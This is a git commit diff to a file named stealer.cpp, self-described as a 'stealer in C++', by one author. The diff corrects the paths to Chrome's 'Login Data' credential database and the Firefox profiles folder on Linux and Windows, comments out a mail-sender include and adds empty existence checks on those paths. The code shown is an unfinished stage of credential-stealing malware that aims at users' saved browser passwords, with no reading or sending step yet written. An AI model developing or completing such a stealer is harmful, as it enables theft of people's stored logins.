affd813dcd76dbd9f133aed2db507049c1618989
Hleb Hatouka <hleb.hatouka@protonmail.com>
2019-10-10 19:07:09 +0300

    check win path

--- stealer.cpp
+++ stealer.cpp
@@ -3,9 +3,10 @@
 // Author      : Hleb Hatouka
 // Description : stealer in C++
 //============================================================================
-#include "mailsender.h"
+//#include "mailsender.h"
 #include <exception>
 #include <filesystem>
+#include <iostream>
 
 namespace fs = std::filesystem;
 
@@ -14,16 +15,21 @@ int main()
     try
     {
 #ifdef __linux__
-
-        std::string chome_db_path = "~/.config/google-chrome/Default";
-        std::string firefox_db_path = "~/.mozzila/firefox/<profilename>";
-
+        std::string chrome_db_path = "~/.config/google-chrome/Default";
+        std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";
 #else _WIN32
-
-        std::string chome_db_path = "\\Google\\Chrome\\User Data\\Default\\Login Data";
-        std::string firefox_db_path = "\\Mozzila\\Firefox\\Profiles\\";
-
+        std::string chrome_db_path = "C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+        std::string firefox_db_path = "C:\\Users\\Admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
 #endif
+
+        if( fs::exists(chrome_db_path))
+        {
+            
+        }
+        if( fs::exists(firefox_db_path))
+        {
+            
+        }
     }
     catch(std::exception &){}
 
